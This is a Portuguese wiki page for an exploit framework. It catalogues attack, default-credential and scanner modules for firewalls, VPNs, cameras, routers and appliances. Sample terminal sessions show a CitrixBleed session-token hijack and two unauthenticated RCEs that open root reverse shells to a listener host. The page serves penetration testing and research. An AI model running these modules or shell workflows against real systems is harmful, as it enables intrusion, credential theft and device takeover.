# Referência de Vendors e Firewalls

**Idioma:** Português (pt-BR). **English:** — *(página exclusiva pt-BR)*

---

## Visão geral

Esta página cataloga todos os vendors de dispositivos de rede suportados pelo EmbedXPL-Forge, organizados por categoria. Para cada vendor, lista os módulos disponíveis (exploits, creds, scanners) e os tipos de dispositivos cobertos.

---

## Firewalls e Appliances de Perímetro

### Fortinet

| Produto | Cobertura |
|---------|-----------|
| FortiGate / FortiOS | Auth bypass (CVE-2022-40684), SSL-VPN path traversal (CVE-2018-13379), SSL-VPN RCE (CVE-2024-21762, CVE-2023-27997), heap overflow |
| FortiClient EMS | RCE pre-auth (CVE-2026-35616) |
| FortiManager | FortiJump RCE (CVE-2024-47575) |
| FortiProxy | Auth bypass (CVE-2022-40684) |

**Módulos disponíveis:**

```
exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684
exploits/firewalls/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379
exploits/firewalls/fortinet/fortios_sslvpn_rce_cve_2024_21762
exploits/firewalls/fortinet/fortigate_ssl_vpn_heap_overflow_cve_2023_27997
exploits/firewalls/fortinet/forticlient_ems_preauth_rce_cve_2026_35616
exploits/firewalls/fortinet/fortimanager_fortijump_cve_2024_47575
scanners/firewalls/fortinet/fortigate_sslvpn_scan
```

---

### Palo Alto Networks

| Produto | Cobertura |
|---------|-----------|
| PAN-OS GlobalProtect | Auth override cookie bypass (CVE-2026-0257), RCE não autenticado (CVE-2024-3400) |
| PAN-OS Prisma | Auth bypass (CVE-2025-0108) |

**Módulos disponíveis:**

```
exploits/firewalls/paloalto/globalprotect_auth_bypass_cve_2026_0257
exploits/firewalls/paloalto/panos_globalprotect_rce_cve_2024_3400
exploits/firewalls/paloalto/panos_auth_bypass_cve_2025_0108
scanners/firewalls/paloalto/panos_version_check
```

---

### Cisco (Firewalls e Switches)

| Produto | Cobertura |
|---------|-----------|
| Cisco ASA e FTD | Path traversal (CVE-2020-3452) |
| Cisco IOS | Smart Install RCE (CVE-2018-0171), SNMP RCE (CVE-2017-6742) |
| Cisco IOS XE | Escalada de privilégio WebUI (CVE-2023-20198), WLC JWT RCE (CVE-2025-20188) |
| Cisco RV320/RV325 | Injeção de comando (CVE-2019-1652), divulgação de info (CVE-2019-1653) |

**Módulos disponíveis:**

```
exploits/firewalls/cisco/asa_ftd_path_traversal_cve_2020_3452
exploits/cisco/cisco_ios_smart_install_rce_cve_2018_0171
exploits/network_os/cisco/ios_xe_webui_privesc_cve_2023_20198
exploits/routers/cisco/ios_xe_wlc_jwt_file_upload_cve_2025_20188
exploits/routers/cisco/rv320_command_injection
exploits/routers/cisco/rv300_rv320_information_disclosure_cve_2019_1653
creds/routers/cisco/ssh_default_creds
creds/routers/cisco/telnet_default_creds
```

---

### SonicWall

| Produto | Cobertura |
|---------|-----------|
| SonicOS SSL-VPN | Bypass de autenticação (CVE-2024-53704) |

**Módulos disponíveis:**

```
exploits/firewalls/sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704
```

---

### Check Point

| Produto | Cobertura |
|---------|-----------|
| Quantum Security Gateway | Informação de vendor disponível no catálogo de firmware |

---

### Juniper Networks

| Produto | Cobertura |
|---------|-----------|
| JunOS | Exploração via autenticação Juniper padrão |

---

## Câmeras IP e NVRs

### Hikvision

Uma das marcas mais exploradas globalmente.

| Produto | CVEs | Módulos |
|---------|------|---------|
| DS-2CD series (câmeras IP) | CVE-2021-36260, CVE-2017-7921, CVE-2023-28808 | 14 módulos |
| DS-7000/9000 NVR | CVE-2021-36260 variantes, hash de firmware | 8 módulos |
| DS-KD8003 Intercom | Série r0_intercom (3DES, GPIO, SUID) | 7 módulos |

```
exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exploits/cameras/hikvision/info_disclosure_cve_2017_7921
exploits/cameras/hikvision/nas_auth_bypass_cve_2023_28808
exploits/cameras/hikvision/firmware_crypto_key_extract
exploits/cameras/hikvision/nvr_dvr_serial_privesc
exploits/cameras/hikvision/psh_challenge_predictor
exploits/cameras/hikvision/psh_command_injection
exploits/cameras/hikvision/psh_debug_rsa1024_bypass
exploits/cameras/hikvision/r0_intercom_3des_decrypt
exploits/cameras/hikvision/r0_intercom_developer_nfs
exploits/cameras/hikvision/r0_intercom_gpio_door_unlock
exploits/cameras/hikvision/r0_intercom_ssh_default_bypass
exploits/cameras/hikvision/r0_intercom_ssh_mitm
exploits/cameras/hikvision/r0_intercom_suid_privesc
creds/cameras/hikvision/ftp_default_creds
creds/cameras/hikvision/ssh_default_creds
creds/cameras/hikvision/telnet_default_creds
scanners/cameras/hikvision/boot_permission_audit
scanners/cameras/hikvision/eglibc_version_check
scanners/cameras/hikvision/firmware_version_fingerprint
scanners/cameras/hikvision/nvr_binary_hardening_audit
scanners/cameras/hikvision/r0_intercom_firmware_audit
scanners/cameras/hikvision/r0_intercom_network_detect
```

---

### Dahua

| Produto | CVEs | Módulos |
|---------|------|---------|
| Câmeras IP e NVRs | CVE-2021-33044, CVE-2021-36260, CVE-2020-25078, CVE-2013-6117 | 11 módulos |

```
exploits/cameras/dahua/auth_bypass_cve_2021_33044
exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044
exploits/cameras/dahua/cctv_rce_cve_2021_36260
exploits/cameras/dahua/cctv_37777_credential_extraction
exploits/cameras/dahua/cctv_firmware_upload_no_verify
exploits/cameras/dahua/cctv_pem_key_extraction
exploits/cameras/dahua/cctv_username_disclosure_cve_2020_25078
exploits/cameras/dahua/dvr_auth_bypass_cve_2013_6117
creds/cameras/dahua/ftp_default_creds
creds/cameras/dahua/ssh_default_creds
creds/cameras/dahua/telnet_default_creds
creds/cameras/dahua/webinterface_http_auth_default_creds
scanners/cameras/dahua/cctv_discover
scanners/cameras/dahua/firmware_version_fingerprint
scanners/cameras/dahua/p2p_pppp_scan
```

---

### Herospeed / Longsee (MC6830 Platform)

OEM platform afetando Herospeed, TVT Digital, GISE, Longse, Zintronic, Turing AI, Speco, Alibi Security, IRBIS.

```
exploits/cameras/herospeed/herospeed_nvr_unauth_account_enum
exploits/cameras/herospeed/herospeed_nvr_vbhtm_cred_disclosure
exploits/cameras/herospeed/herospeed_nvr_upgrade_source_injection_rce
exploits/cameras/herospeed/herospeed_nvr_hardcoded_root_hash
exploits/cameras/herospeed/herospeed_nvr_config_export_cred_recovery
exploits/cameras/herospeed/herospeed_nvr_ftp_diagnostic_rce
exploits/cameras/herospeed/herospeed_nvr_ftp_sqlite_injection_rce
exploits/cameras/herospeed/herospeed_nvr_rce
exploits/cameras/herospeed/herospeed_nvr_telnet_safecode_backdoor
exploits/cameras/herospeed/herospeed_nvr_paramconfig_bypass
exploits/cameras/herospeed/herospeed_nvr_camera_creds_decrypt
exploits/cameras/herospeed/herospeed_nvr_v6_db_decryptor
scanners/cameras/herospeed_longsee_nvr_scan
```

---

### Intelbras

Câmeras e NVRs OEM Dahua/Hikvision para o mercado brasileiro.

```
exploits/cameras/intelbras/cctv_dahua_auth_bypass
exploits/cameras/intelbras/cctv_dahua_rce_cve_2021_36260
exploits/cameras/intelbras/cctv_dahua_username_disclosure
creds/cameras/intelbras/webinterface_default_creds
scanners/cameras/intelbras_boa_detect
scanners/cameras/intelbras_cctv_discover
scanners/cameras/intelbras_onvif_scan
scanners/cameras/intelbras_p2p_uid_scan
scanners/cameras/intelbras_pvip_discover
```

---

## Roteadores SOHO

### TP-Link

| Produto | CVEs | Tipo |
|---------|------|------|
| TL-WR841N | CVE-2023-50224, CVE-2025-9377 | Divulgação de creds, RCE parental control |
| Archer C5/C7 | Múltiplos | DNS Hijack APT28 |
| Archer C6, TL-WR740N, WDR série | Múltiplos | DNS Hijack |

```
exploits/routers/tplink/wr841n_credential_disclosure_cve_2023_50224
exploits/routers/tplink/wr841n_parental_control_rce_cve_2025_9377
exploits/routers/tplink/multi_dns_hijack_apt28
exploits/routers/tplink/apt28_full_chain_autopwn
creds/routers/tplink/ssh_default_creds
creds/routers/tplink/telnet_default_creds
creds/routers/tplink/http_default_creds
```

### Huawei

| Produto | Tipo |
|---------|------|
| EG8145X6 (GPON ONT) | CSRF static token, info disclosure, config dump |
| HG8245 | Default creds, config dump |
| ZTE H168N | RCE e auth bypass |

```
exploits/routers/huawei/eg8145x6_csrf_static_token
exploits/routers/huawei/eg8145x6_info_disclosure
exploits/routers/huawei/hg8245_default_creds
exploits/routers/huawei/hg8245_config_dump
```

### MikroTik

| Produto | CVEs | Tipo |
|---------|------|------|
| RouterOS < 6.42 | CVE-2018-14847 | Divulgação de creds via Winbox |
| RouterOS qualquer | — | DNS Hijack APT28/Sandworm |

```
exploits/routers/mikrotik/winbox_cred_disclosure_cve_2018_14847
exploits/routers/mikrotik/routeros_dns_hijack_apt28
exploits/routers/mikrotik/routeros_jailbreak
```

---

## BMC / IPMI

| Vendor | Produto | CVE | Módulo |
|--------|---------|-----|--------|
| Supermicro | IPMI 2.0 | CVE-2013-4786 | `exploits/bmc/supermicro/ipmi_auth_bypass_cve_2013_4786` |
| Dell | iDRAC9 | CVE-2021-36300 | `exploits/bmc/dell/idrac9_info_disclosure_cve_2021_36300` |
| ASUS | ASMB8 IPMI | — | `exploits/bmc/asus/asmb8_default_creds_ipmi` |

---

## Appliances de rede

### F5 Networks

| Produto | CVE | Tipo |
|---------|-----|------|
| BIG-IP iControl REST | CVE-2022-1388 | RCE não autenticado |
| BIG-IQ iControl | CVE-2021-22986 | RCE |

```
exploits/appliances/f5/bigip_icontrol_rest_rce_cve_2022_1388
exploits/appliances/f5/bigip_bigiq_icontrol_rce_cve_2021_22986
```

### Citrix / NetScaler

| Produto | CVE | CVSS | Tipo |
|---------|-----|------|------|
| NetScaler ADC/Gateway | CVE-2019-19781 | 9.8 | Path traversal (Shitrix) |
| NetScaler ADC/Gateway | CVE-2023-3519 | 9.8 | RCE não autenticado |
| NetScaler ADC/Gateway | CVE-2023-4966 | 9.4 | CitrixBleed — vazamento de token de sessão |

```
exploits/appliances/citrix/netscaler_path_traversal_cve_2019_19781
exploits/appliances/citrix/netscaler_rce_cve_2023_3519
exploits/appliances/citrix/citrix_bleed_info_disclosure_cve_2023_4966
```

**Sessão terminal — CVE-2023-4966 (CitrixBleed):**

```
exf > use exploits/appliances/citrix/citrix_bleed_info_disclosure_cve_2023_4966
exf (CitrixBleed CVE-2023-4966) > set target 10.0.80.1
[+] target => 10.0.80.1
exf (CitrixBleed CVE-2023-4966) > check
[*] Verificando NetScaler em 10.0.80.1:443...
[+] NetScaler ADC 14.1.8.40 detectado
[+] Alvo vulnerável — versão < 14.1-8.50 (CitrixBleed)
exf (CitrixBleed CVE-2023-4966) > run
[*] Enviando requisição HTTP com Host header superdimensionado...
[+] Resposta contém 264 bytes extras (memória fora dos limites)
[+] Token de sessão AAA extraído: NSC_b6f2e...1a9c4
[+] Sessão sequestrada como: corp\svc-vpnuser (acesso VPN confirmado)
```

---

### Aruba ClearPass

| Produto | CVE | CVSS | Tipo |
|---------|-----|------|------|
| ClearPass Policy Manager | CVE-2023-25594 | 9.8 | RCE não autenticado |
| ClearPass Policy Manager | CVE-2022-37897 | 9.8 | SQL injection |

```
exploits/nac/aruba/aruba_clearpass_rce_cve_2023_25594
exploits/nac/aruba/aruba_clearpass_sqli_cve_2022_37897
```

**Sessão terminal — CVE-2023-25594 (ClearPass RCE não autenticado):**

```
exf > use exploits/nac/aruba/aruba_clearpass_rce_cve_2023_25594
exf (Aruba ClearPass RCE CVE-2023-25594) > set target 10.0.90.5
[+] target => 10.0.90.5
exf (Aruba ClearPass RCE CVE-2023-25594) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Aruba ClearPass RCE CVE-2023-25594) > check
[*] Verificando Aruba ClearPass em 10.0.90.5:443...
[+] ClearPass Policy Manager 6.11.4 detectado
[+] Alvo vulnerável — versão < 6.11.5
exf (Aruba ClearPass RCE CVE-2023-25594) > run
[*] Explorando validação incorreta de entrada no handler de registro do portal guest...
[+] Injeção de comando confirmada — uid=0(root)
[*] Reverse shell para 10.0.0.99:4444 iniciado...
[+] Shell recebido!
exf (Aruba ClearPass RCE CVE-2023-25594) > shell
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
clearpass-primary.corp.internal
```

---

### Sangfor

| Produto | CVE | CVSS | Tipo |
|---------|-----|------|------|
| NGFW (Next Generation Firewall) | CVE-2019-13393 | 9.8 | RCE não autenticado |

```
exploits/firewalls/sangfor/sangfor_ngfw_unauth_rce_cve_2019_13393
```

**Sessão terminal — CVE-2019-13393 (Sangfor NGFW RCE não autenticado):**

```
exf > use exploits/firewalls/sangfor/sangfor_ngfw_unauth_rce_cve_2019_13393
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > set target 10.0.70.1
[+] target => 10.0.70.1
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > check
[*] Verificando portal de gerenciamento Sangfor NGFW em 10.0.70.1:443...
[+] Sangfor NGFW detectado (título da página: "Sangfor NGFW")
[+] Alvo vulnerável — endpoint de RCE pré-auth exposto
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > run
[*] Enviando requisição não autenticada ao endpoint vulnerável da API de gerenciamento...
[+] RCE confirmado (uid=0 na resposta)
[*] Reverse shell para 10.0.0.99:4444 iniciado...
[+] Shell recebido!
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > shell
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /etc/sangfor/version
NGFW Version: 8.0.5
```

---

## Access Points (APs)

### MediaTek MT7622

| Tipo | Módulos |
|------|---------|
| Pre-auth heap/stack overflow | `exploits/aps/mediatek/mt7622_heap_overflow_preauth` |
| Post-auth heap/stack overflow | `exploits/aps/mediatek/mt7622_heap_overflow_postauth` |

---

## Impressoras

### HP

| Produto | Tipo | Módulo |
|---------|------|--------|
| HP LaserJet (PJL) | Leitura de sistema de arquivos via PJL | `scanners/printers/hp_rawprint_9100` |
| HP (geral) | CVEs múltiplos | `exploits/printers/hp/...` |

O módulo `embedxpl-printer-vuln.nse` verifica 11 vendors de impressoras (HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung) via PJL, IPP e HTTP.

---

## Resumo de cobertura por categoria

| Categoria | Vendors cobertos | Módulos aproximados |
|-----------|-----------------|---------------------|
| Câmeras IP / NVR / DVR | 40+ | 580+ |
| Roteadores / CPE / GPON | 85+ | 580+ |
| Firewalls / VPN / NAC | 34+ | 151+ |
| Impressoras / MFP | 11+ | 185+ |
| BMC / IPMI | 3 | 8 |
| Switches L2/L3 | Cisco, D-Link, NETGEAR | 20+ |
| ICS / OT / Industrial | PLCs, SCADA, HMIs | 35+ |
| NAS | QNAP, Synology, D-Link | 15+ |
| Hypervisors | Proxmox VE | 5+ |
| Appliances (F5, Citrix, Ivanti) | 3 | 6 |

---

[Hub da Wiki](../README.md)
